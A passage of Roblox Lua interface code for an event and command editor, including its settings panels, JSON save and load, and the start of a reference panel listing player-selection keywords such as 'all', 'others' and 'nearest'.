		table.insert(shade3,settingsTemplates.Players.CustomButton) table.insert(shade2,settingsTemplates.Players.Custom) table.insert(text1,settingsTemplates.Players.Custom)
		table.insert(shade3,settingsTemplates.Players.Any.Button) table.insert(shade3,settingsTemplates.Players.Me.Button) table.insert(text1,settingsTemplates.Players.Any)
		table.insert(text1,settingsTemplates.Players.Me) table.insert(text1,settingsTemplates.Strings.Title) table.insert(text1,settingsTemplates.Strings.Any)
		table.insert(shade3,settingsTemplates.Strings.Any.Button) table.insert(shade3,settingsTemplates.Strings.CustomButton) table.insert(text1,settingsTemplates.Strings.Custom)
		table.insert(shade2,settingsTemplates.Strings.Custom)
		table.insert(text1,settingsTemplates.Players.Me) table.insert(text1,settingsTemplates.Numbers.Title) table.insert(text1,settingsTemplates.Numbers.Any)
		table.insert(shade3,settingsTemplates.Numbers.Any.Button) table.insert(shade3,settingsTemplates.Numbers.CustomButton) table.insert(text1,settingsTemplates.Numbers.Custom)
		table.insert(shade2,settingsTemplates.Numbers.Custom)

		local tween = game:GetService("TweenService")
		local tweenInf = TweenInfo.new(0.25,Enum.EasingStyle.Quart,Enum.EasingDirection.Out)

		local currentlyEditingCmd = nil

		settingsFrame:WaitForChild("Close").MouseButton1Click:Connect(function()
			settingsFrame:TweenPosition(UDim2.new(0,-150,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
		end)

		local function resizeList()
			local size = 0

			for i,v in pairs(eventListHolder:GetChildren()) do
				if v.Name == "EventTemplate" then
					size = size + 20
					if v.Expand.Text == "V" then
						size = size + 20*(1+(#events[v.EventName.Text].commands or 0))
					end
				end
			end

			tween:Create(eventList,tweenInf,{CanvasSize = UDim2.new(0,0,0,size)}):Play()

			if size > eventList.AbsoluteSize.Y then
				eventListHolder.Size = UDim2.new(1,-8,1,0)
			else
				eventListHolder.Size = UDim2.new(1,0,1,0)
			end
		end

		local function resizeSettingsList()
			local size = 0

			for i,v in pairs(settingsList:GetChildren()) do
				if v:IsA("Frame") then
					size = size + v.AbsoluteSize.Y
				end
			end

			settingsList.Parent.CanvasSize = UDim2.new(0,0,0,size)

			if size > settingsList.Parent.AbsoluteSize.Y then
				settingsList.Size = UDim2.new(1,-8,1,0)
			else
				settingsList.Size = UDim2.new(1,0,1,0)
			end
		end

		local function setupCheckbox(button,callback)
			local enabled = button.On.BackgroundTransparency == 0

			local function update()
				button.On.BackgroundTransparency = (enabled and 0 or 1)
			end

			button.On.MouseButton1Click:Connect(function()
				enabled = not enabled
				update()
				if callback then callback(enabled) end
			end)

			return {
				Toggle = function(nocall) enabled = not enabled update() if not nocall and callback then callback(enabled) end end,
				Enable = function(nocall) if enabled then return end enabled = true update()if not nocall and callback then callback(enabled) end end,
				Disable = function(nocall) if not enabled then return end enabled = false update()if not nocall and callback then callback(enabled) end end,
				IsEnabled = function() return enabled end
			}
		end

		local function openSettingsEditor(event,cmd)
			currentlyEditingCmd = cmd

			for i,v in pairs(settingsList:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end

			local delayEditor = settingsTemplates.DelayEditor:Clone()
			delayEditor.Secs.FocusLost:Connect(function()
				cmd[3] = tonumber(delayEditor.Secs.Text) or 0
				delayEditor.Secs.Text = cmd[3]
				if onEdited then onEdited() end
			end)
			delayEditor.Secs.Text = cmd[3]
			delayEditor.Visible = true
			table.insert(shade2,delayEditor.Secs)
			table.insert(text1,delayEditor.Secs)
			table.insert(text1,delayEditor.Secs.Label)
			delayEditor.Parent = settingsList

			for i,v in pairs(event.sets) do
				if v.Type == "Player" then
					local template = settingsTemplates.Players:Clone()
					template.Title.Text = v.Name or "Player"

					local me,any,custom

					me = setupCheckbox(template.Me.Button,function(on)
						if not on then return end
						any.Disable()
						custom.Disable()
						cmd[2][i] = 0
						if onEdited then onEdited() end
					end)

					any = setupCheckbox(template.Any.Button,function(on)
						if not on then return end
						me.Disable()
						custom.Disable()
						cmd[2][i] = 1
						if onEdited then onEdited() end
					end)

					local customTextBox = template.Custom
					custom = setupCheckbox(template.CustomButton,function(on)
						if not on then return end
						me.Disable()
						any.Disable()
						cmd[2][i] = customTextBox.Text
						if onEdited then onEdited() end
					end)

					ViewportTextBox.convert(customTextBox)
					customTextBox.FocusLost:Connect(function()
						if custom:IsEnabled() then
							cmd[2][i] = customTextBox.Text
							if onEdited then onEdited() end
						end
					end)

					local cVal = cmd[2][i]
					if cVal == 0 then
						me:Enable()
					elseif cVal == 1 then
						any:Enable()
					else
						custom:Enable()
						customTextBox.Text = cVal
					end

					template.Visible = true
					table.insert(text1,template.Title)
					table.insert(shade3,template.CustomButton)
					table.insert(shade3,template.Any.Button)
					table.insert(shade3,template.Me.Button)
					table.insert(text1,template.Any)
					table.insert(text1,template.Me)
					template.Parent = settingsList
				elseif v.Type == "String" then
					local template = settingsTemplates.Strings:Clone()
					template.Title.Text = v.Name or "String"

					local any,custom

					any = setupCheckbox(template.Any.Button,function(on)
						if not on then return end
						custom.Disable()
						cmd[2][i] = 0
						if onEdited then onEdited() end
					end)

					local customTextBox = template.Custom
					custom = setupCheckbox(template.CustomButton,function(on)
						if not on then return end
						any.Disable()
						cmd[2][i] = customTextBox.Text
						if onEdited then onEdited() end
					end)

					ViewportTextBox.convert(customTextBox)
					customTextBox.FocusLost:Connect(function()
						if custom:IsEnabled() then
							cmd[2][i] = customTextBox.Text
							if onEdited then onEdited() end
						end
					end)

					local cVal = cmd[2][i]
					if cVal == 0 then
						any:Enable()
					else
						custom:Enable()
						customTextBox.Text = cVal
					end

					template.Visible = true
					table.insert(text1,template.Title)
					table.insert(text1,template.Any)
					table.insert(shade3,template.Any.Button)
					table.insert(shade3,template.CustomButton)
					template.Parent = settingsList
				elseif v.Type == "Number" then
					local template = settingsTemplates.Numbers:Clone()
					template.Title.Text = v.Name or "Number"

					local any,custom

					any = setupCheckbox(template.Any.Button,function(on)
						if not on then return end
						custom.Disable()
						cmd[2][i] = 0
						if onEdited then onEdited() end
					end)

					local customTextBox = template.Custom
					custom = setupCheckbox(template.CustomButton,function(on)
						if not on then return end
						any.Disable()
						cmd[2][i] = customTextBox.Text
						if onEdited then onEdited() end
					end)

					ViewportTextBox.convert(customTextBox)
					customTextBox.FocusLost:Connect(function()
						cmd[2][i] = tonumber(customTextBox.Text) or 0
						customTextBox.Text = cmd[2][i]
						if custom:IsEnabled() then
							if onEdited then onEdited() end
						end
					end)

					local cVal = cmd[2][i]
					if cVal == 0 then
						any:Enable()
					else
						custom:Enable()
						customTextBox.Text = cVal
					end

					template.Visible = true
					table.insert(text1,template.Title)
					table.insert(text1,template.Any)
					table.insert(shade3,template.Any.Button)
					table.insert(shade3,template.CustomButton)
					template.Parent = settingsList
				end
			end
			resizeSettingsList()
			settingsFrame:TweenPosition(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
		end

		local function defaultSettings(ev)
			local res = {}

			for i,v in pairs(ev.sets) do
				if v.Type == "Player" then
					res[#res+1] = v.Default or 0
				elseif v.Type == "String" then
					res[#res+1] = v.Default or 0
				elseif v.Type == "Number" then
					res[#res+1] = v.Default or 0
				end
			end

			return res
		end

		local function refreshList()
			for i,v in pairs(eventListHolder:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end

			for name,event in pairs(events) do
				local eventF = eventTemplate:Clone()
				eventF.EventName.Text = name
				eventF.Visible = true
				table.insert(shade2,eventF)
				table.insert(text1,eventF.EventName)
				table.insert(shade1,eventF.Cmds.Add)

				local expanded = false
				eventF.Expand.MouseButton1Down:Connect(function()
					expanded = not expanded
					eventF:TweenSize(UDim2.new(1,0,0,20 + (expanded and 20*#eventF.Cmds.Holder:GetChildren() or 0)),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					eventF.Expand.Text = expanded and "V" or ">"
					resizeList()
				end)

				local function refreshCommands()
					for i,v in pairs(eventF.Cmds.Holder:GetChildren()) do
						if v.Name == "CmdTemplate" then
							v:Destroy()
						end
					end

					for i,cmd in pairs(event.commands) do
						local cmdF = cmdTemplate:Clone()
						local cmdTextBox = cmdF.TextBox
						ViewportTextBox.convert(cmdTextBox)
						cmdTextBox.Text = cmd[1]
						cmdF.Visible = true
						table.insert(shade1,cmdF)
						table.insert(shade2,cmdF.Delete)
						table.insert(shade2,cmdF.Settings)

						cmdTextBox.FocusLost:Connect(function()
							event.commands[i] = {cmdTextBox.Text,cmd[2],cmd[3]}
							if onEdited then onEdited() end
						end)

						cmdF.Settings.MouseButton1Click:Connect(function()
							openSettingsEditor(event,cmd)
						end)

						cmdF.Delete.MouseButton1Click:Connect(function()
							table.remove(event.commands,i)
							refreshCommands()
							resizeList()

							if currentlyEditingCmd == cmd then
								settingsFrame:TweenPosition(UDim2.new(0,-150,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
							end
							if onEdited then onEdited() end
						end)

						cmdF.Parent = eventF.Cmds.Holder
					end

					eventF:TweenSize(UDim2.new(1,0,0,20 + (expanded and 20*#eventF.Cmds.Holder:GetChildren() or 0)),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
				end

				local newBox = eventF.Cmds.Add.TextBox
				ViewportTextBox.convert(newBox)
				newBox.FocusLost:Connect(function(enter)
					if enter then
						event.commands[#event.commands+1] = {newBox.Text,defaultSettings(event),0}
						newBox.Text = ""

						refreshCommands()
						resizeList()
						if onEdited then onEdited() end
					end
				end)

				--eventF:GetPropertyChangedSignal("AbsoluteSize"):Connect(resizeList)

				eventF.Parent = eventListHolder

				refreshCommands()
			end

			resizeList()
		end

		local function saveData()
			local result = {}
			for i,v in pairs(events) do
				result[i] = v.commands
			end
			return game:GetService("HttpService"):JSONEncode(result)
		end

		local function loadData(str)
			local data = game:GetService("HttpService"):JSONDecode(str)
			for i,v in pairs(data) do
				if events[i] then
					events[i].commands = v
				end
			end
		end

		local function addCmd(event,data)
			table.insert(events[event].commands,data)
		end

		local function setOnEdited(f)
			if type(f) == "function" then
				onEdited = f
			end
		end

		main.TopBar.Close.MouseButton1Click:Connect(function()
			main:TweenPosition(UDim2.new(0.5,-175,0,-500), "InOut", "Quart", 0.5, true, nil)
		end)
		dragGUI(main)
		main.Parent = PARENT

		return {
			RegisterEvent = registerEvent,
			FireEvent = fireEvent,
			Refresh = refreshList,
			SaveData = saveData,
			LoadData = loadData,
			AddCmd = addCmd,
			Frame = main,
			SetOnEdited = setOnEdited
		}
	end)()

	reference = (function()
		local main = create({
			{1,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,Name="Main",Position=UDim2.new(0.5,-250,0,-500),Size=UDim2.new(0,500,0,20),ZIndex=10,}},
			{2,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="TopBar",Parent={1},Size=UDim2.new(1,0,0,20),ZIndex=10,}},
			{3,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={2},Size=UDim2.new(1,0,0.94999998807907,0),Text="Reference",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{4,"TextButton",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Close",Parent={2},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{5,"ImageLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5054663650",Parent={4},Position=UDim2.new(0,5,0,5),Size=UDim2.new(0,10,0,10),ZIndex=10,}},
			{6,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BorderSizePixel=0,Name="Content",Parent={1},Position=UDim2.new(0,0,0,20),Size=UDim2.new(1,0,0,300),ZIndex=10,}},
			{7,"ScrollingFrame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage="rbxasset://textures/ui/Scroll/scroll-middle.png",CanvasSize=UDim2.new(0,0,0,1295),Name="List",Parent={6},ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,0,1,0),TopImage="rbxasset://textures/ui/Scroll/scroll-middle.png",VerticalScrollBarInset=2,ZIndex=10,}},
			{8,"UIListLayout",{Parent={7},SortOrder=2,}},
			{9,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,411),ZIndex=10,}},
			{10,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={9},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Special Player Cases",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{11,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={9},Position=UDim2.new(0,8,0,25),Size=UDim2.new(1,-8,0,20),Text="These keywords can be used to quickly select groups of players in commands:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{12,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={9},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{13,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Cases",Parent={9},Position=UDim2.new(0,8,0,55),Size=UDim2.new(1,-16,0,342),ZIndex=10,}},
			{14,"UIListLayout",{Parent={13},SortOrder=2,}},
			{15,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{16,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={15},Size=UDim2.new(1,0,1,0),Text="all",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{17,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={15},Position=UDim2.new(0,15,0,0),Size=UDim2.new(1,0,1,0),Text="- includes everyone",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{18,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{19,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={18},Size=UDim2.new(1,0,1,0),Text="others",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{20,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={18},Position=UDim2.new(0,37,0,0),Size=UDim2.new(1,0,1,0),Text="- includes everyone except you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{21,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{22,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={21},Size=UDim2.new(1,0,1,0),Text="me",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{23,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={21},Position=UDim2.new(0,19,0,0),Size=UDim2.new(1,0,1,0),Text="- includes your player only",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{24,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{25,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={24},Size=UDim2.new(1,0,1,0),Text="#[number]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{26,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={24},Position=UDim2.new(0,59,0,0),Size=UDim2.new(1,0,1,0),Text="- gets a specified amount of random players",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{27,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{28,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={27},Size=UDim2.new(1,0,1,0),Text="random",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{29,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={27},Position=UDim2.new(0,44,0,0),Size=UDim2.new(1,0,1,0),Text="- affects a random player",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{30,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{31,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={30},Size=UDim2.new(1,0,1,0),Text="%[team name]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{32,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={30},Position=UDim2.new(0,78,0,0),Size=UDim2.new(1,0,1,0),Text="- includes everyone on a given team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{33,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{34,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={33},Size=UDim2.new(1,0,1,0),Text="allies / team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{35,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={33},Position=UDim2.new(0,63,0,0),Size=UDim2.new(1,0,1,0),Text="- players who are on your team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{36,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{37,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={36},Size=UDim2.new(1,0,1,0),Text="enemies / nonteam",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{38,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={36},Position=UDim2.new(0,101,0,0),Size=UDim2.new(1,0,1,0),Text="- players who are not on your team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{39,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{40,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={39},Size=UDim2.new(1,0,1,0),Text="friends",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{41,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={39},Position=UDim2.new(0,40,0,0),Size=UDim2.new(1,0,1,0),Text="- anyone who is friends with you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{42,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{43,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={42},Size=UDim2.new(1,0,1,0),Text="nonfriends",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{44,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={42},Position=UDim2.new(0,61,0,0),Size=UDim2.new(1,0,1,0),Text="- anyone who is not friends with you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{45,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{46,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={45},Size=UDim2.new(1,0,1,0),Text="guests",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{47,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={45},Position=UDim2.new(0,36,0,0),Size=UDim2.new(1,0,1,0),Text="- guest players (obsolete)",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{48,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{49,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={48},Size=UDim2.new(1,0,1,0),Text="bacons",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{50,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={48},Position=UDim2.new(0,40,0,0),Size=UDim2.new(1,0,1,0),Text="- anyone with the \"bacon\" or pal hair",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{51,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{52,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={51},Size=UDim2.new(1,0,1,0),Text="age[number]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{53,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={51},Position=UDim2.new(0,71,0,0),Size=UDim2.new(1,0,1,0),Text="- includes anyone below or at the given age",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{54,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{55,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={54},Size=UDim2.new(1,0,1,0),Text="rad[number]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{56,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={54},Position=UDim2.new(0,70,0,0),Size=UDim2.new(1,0,1,0),Text="- includes anyone within the given radius",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{57,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{58,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={57},Size=UDim2.new(1,0,1,0),Text="nearest",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{59,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={57},Position=UDim2.new(0,43,0,0),Size=UDim2.new(1,0,1,0),Text="- gets the closest player to you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{60,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{61,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={60},Size=UDim2.new(1,0,1,0),Text="farthest",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{62,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={60},Position=UDim2.new(0,46,0,0),Size=UDim2.new(1,0,1,0),Text="- gets the farthest player from you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{63,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{64,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={63},Size=UDim2.new(1,0,1,0),Text="group[ID]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{65,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={63},Position=UDim2.new(0,55,0,0),Size=UDim2.new(1,0,1,0),Text="- gets players who are in a certain group",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{66,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{67,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={66},Size=UDim2.new(1,0,1,0),Text="alive",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
